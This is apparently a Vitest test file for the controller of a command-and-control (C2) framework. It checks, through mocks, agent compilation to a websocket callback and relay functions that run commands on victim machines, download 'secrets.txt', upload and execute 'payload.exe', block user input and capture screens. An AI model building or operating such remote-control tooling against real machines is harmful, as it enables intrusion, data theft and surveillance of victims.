import { describe, it, expect, beforeEach } from "vitest";
import { C2Controller } from "../../../src/infra/controllers/C2Controller.js";
import { CompileC2UseCase } from "../../../src/application/c2/use-cases/CompileC2UseCase.js";
import { MockC2Compiler } from "../../mocks/MockC2Compiler.js";
import { MockC2RelayClient } from "../../mocks/MockC2RelayClient.js";
import { Result } from "../../../src/shared/Result.js";

describe("C2Controller", () => {
  let compiler: MockC2Compiler;
  let relay: MockC2RelayClient;
  let controller: C2Controller;
  let logs: string[];

  beforeEach(() => {
    compiler = new MockC2Compiler();
    relay = new MockC2RelayClient();
    const useCase = new CompileC2UseCase(compiler);
    controller = new C2Controller(useCase, relay);
    logs = [];
  });

  const onLog = (msg: string) => logs.push(msg);

  it("deve expor relay como propriedade readonly", () => {
    expect(controller.relay).toBe(relay);
  });

  it("deve compilar C2 agent com sucesso", async () => {
    const result = await controller.compile("ws://10.0.0.1:4444", onLog);

    expect(result.isSuccess).toBe(true);
    expect(result.value!.binaryPath).toContain("c2_agent.exe");
    expect(result.value!.buildId).toBe("123");
    expect(compiler.calls).toEqual(["ws://10.0.0.1:4444"]);
  });

  it("deve propagar falha de compilação", async () => {
    compiler.result = Result.fail("Imagem Docker c2-compiler não encontrada");

    const result = await controller.compile("ws://localhost:4444", onLog);

    expect(result.isFailure).toBe(true);
    expect(result.error).toContain("c2-compiler não encontrada");
  });

  it("deve logar progresso da compilação", async () => {
    await controller.compile("ws://localhost:4444", onLog);

    expect(logs.length).toBeGreaterThan(0);
    expect(logs.some((l) => l.includes("[c2]"))).toBe(true);
  });

  it("relay deve conectar ao servidor Ruby", async () => {
    await controller.relay.connect("ws://relay.local:4444", "secret-token");

    expect(relay.connectCalls).toEqual([{ url: "ws://relay.local:4444", token: "secret-token" }]);
    expect(relay.isConnected()).toBe(true);
  });

  it("relay deve desconectar", async () => {
    await controller.relay.connect("ws://relay.local:4444");
    controller.relay.disconnect();

    expect(relay.disconnectCalls).toBe(1);
    expect(relay.isConnected()).toBe(false);
  });

  it("relay deve enviar comandos para máquinas", () => {
    controller.relay.sendCommand("machine-1", "whoami");
    controller.relay.sendCommand("machine-1", "dir C:\\");

    expect(relay.commandCalls).toEqual([
      { machineId: "machine-1", command: "whoami" },
      { machineId: "machine-1", command: "dir C:\\" },
    ]);
  });

  it("relay deve listar arquivos remotos", () => {
    controller.relay.fileList("machine-1", "C:\\Users");

    expect(relay.fileListCalls).toEqual([{ machineId: "machine-1", path: "C:\\Users" }]);
  });

  it("relay deve fazer download de arquivo", () => {
    controller.relay.fileDownload("machine-1", "C:\\secrets.txt");

    expect(relay.fileDownloadCalls).toEqual([{ machineId: "machine-1", path: "C:\\secrets.txt" }]);
  });

  it("relay deve fazer upload de arquivo", () => {
    controller.relay.fileUpload("machine-1", "C:\\payload.exe", "base64data");

    expect(relay.fileUploadCalls).toEqual([{
      machineId: "machine-1",
      path: "C:\\payload.exe",
      data: "base64data",
    }]);
  });

  it("relay deve executar arquivo remoto", () => {
    controller.relay.fileExec("machine-1", "C:\\payload.exe");

    expect(relay.fileExecCalls).toEqual([{ machineId: "machine-1", path: "C:\\payload.exe" }]);
  });

  it("relay deve bloquear/desbloquear input", () => {
    controller.relay.blockInput("machine-1");
    controller.relay.unblockInput("machine-1");

    expect(relay.blockInputCalls).toEqual(["machine-1"]);
    expect(relay.unblockInputCalls).toEqual(["machine-1"]);
  });

  it("relay deve iniciar/parar screen capture", () => {
    controller.relay.screenStart("machine-1", 30);
    controller.relay.screenStop("machine-1");

    expect(relay.screenStartCalls).toEqual([{ machineId: "machine-1", fps: 30 }]);
    expect(relay.screenStopCalls).toEqual(["machine-1"]);
  });

  it("relay deve listar máquinas", () => {
    controller.relay.listMachines();
    controller.relay.listMachines();

    expect(relay.listMachinesCalls).toBe(2);
  });

  it("relay deve receber eventos do servidor", () => {
    const events: any[] = [];
    controller.relay.onEvent((e) => events.push(e));

    relay.simulateEvent({
      type: "machine_connected",
      machine: { id: "m1", name: "PC-01", os: "Windows 10", ip: "192.168.1.5", connected_at: "2026-04-10T12:00:00Z" },
    });

    expect(events).toHaveLength(1);
    expect(events[0].type).toBe("machine_connected");
    expect(events[0].machine.name).toBe("PC-01");
  });

  it("relay deve permitir unsubscribe de eventos", () => {
    const events: any[] = [];
    const unsub = controller.relay.onEvent((e) => events.push(e));

    relay.simulateEvent({ type: "machines", list: [] });
    expect(events).toHaveLength(1);

    unsub();
    relay.simulateEvent({ type: "machines", list: [] });
    expect(events).toHaveLength(1);
  });
});
